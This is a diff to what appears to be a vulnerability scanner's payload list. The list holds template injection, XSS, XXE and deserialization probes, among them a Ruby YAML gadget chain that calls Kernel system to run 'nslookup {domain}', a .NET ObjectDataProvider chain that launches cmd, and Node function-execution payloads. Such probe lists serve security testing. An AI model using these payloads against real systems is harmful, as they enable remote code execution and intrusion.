@@ -105,7 +105,6 @@ ${"invalid"?no_such_builtin}
 {{#invalid}}{{/invalid}}
 {{> invalid_partial}}
 {invalid_function()}
-{{$undefined->method()}}
 <%=invalid%>
 <%=raise 'ssti_error'%>
 =invalid_var
@@ -174,10 +173,8 @@ new GroovyShell().evaluate('invalid syntax {{{}}}')
 <form id="x"><input name="action" value="javascript:alert(1337)"></form>
 <noscript><p title="</noscript><img src=x onerror=alert(1337)>">
 <a href="data:text/html,<script>alert(1337)</script>">click</a>
-<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe "1337">]><root>&xxe;</root>
-<foo>1337</foo>
-<![CDATA[1337]]>
-<!DOCTYPE foo [<!ENTITY a "&#x26;b;"><!ENTITY b "1337">]><foo>&a;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM>]><root/>
+<!DOCTYPE foo [<!ENTITY a "&#x26;b;"><!ENTITY b "&#x26;a;">]><foo>&a;</foo>
 http://[invalid
 http://
 http:///
@@ -276,7 +273,7 @@ a:1:{i:0;O:23:"UndefinedClassName1337":0:{}}
 {"rce":"_$$ND_FUNC$$_function(){throw new Error('1337')}()"}
 !!invalid_tag_probe 1337
 !!js/regexp /[invalid/
-{"__js":"throw new Error(1337)"}
+{"fn":{"__js_function":"function(){return 7*191}"}}
 {"__proto__":{"__cryo__":{"reduce":"_$$ND_FUNC$$_function(){throw new Error(1337)}()"}}}
 --- !ruby/object:NonExistentClass1337\ni: x
 --- !ruby/object:Gem::Requirement\nrequirements:\n  !ruby/object:Gem::Package::TarReader\n  io: &1 !ruby/object:Net::BufferedIO\n    io: &1 !ruby/object:Gem::Package::TarReader::Entry\n       read: 0\n       header: "abc"\n    debug_output: &1 !ruby/object:Net::WriteAdapter\n       socket: &1 !ruby/object:Gem::RequestSet\n           sets: !ruby/object:Net::WriteAdapter\n               socket: !ruby/module 'Kernel'\n               method_id: :system\n           git_set: nslookup {domain}\n       method_id: :resolve
@@ -316,7 +313,7 @@ AAEAAAD/////AQAAAAAAAAAEAQAAAA==
 AAEAAAD/////AQAAAAAAAAAEAQAAAD1TeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Tb3J0ZWRTZXRgMVtbU3lzdGVtLlN0cmluZw==
 __VIEWSTATE=/wEPDwUKLTEyMzQ1Njc4OQ==
 __VIEWSTATEGENERATOR=CA0B0334
-{"__type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","ObjectInstance":{"__type":"System.Diagnostics.Process, System","StartInfo":{"__type":"System.Diagnostics.ProcessStartInfo, System","FileName":"cmd","Arguments":"/c echo 1337"}}}
+{"__type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","ObjectInstance":{"__type":"System.Diagnostics.Process, System","StartInfo":{"__type":"System.Diagnostics.ProcessStartInfo, System","FileName":"cmd","Arguments":"/c set /a 7*191"}}}
 /wEAAQAAAP////8BAAAAAAAAAA==
 AAEAAAD/////AQAAAAAAAAAMAQAAABVTeXN0ZW0uV2luZG93cy5Gb3Jtcw==
 cHN0MAUKBAAAAAAAAAAA
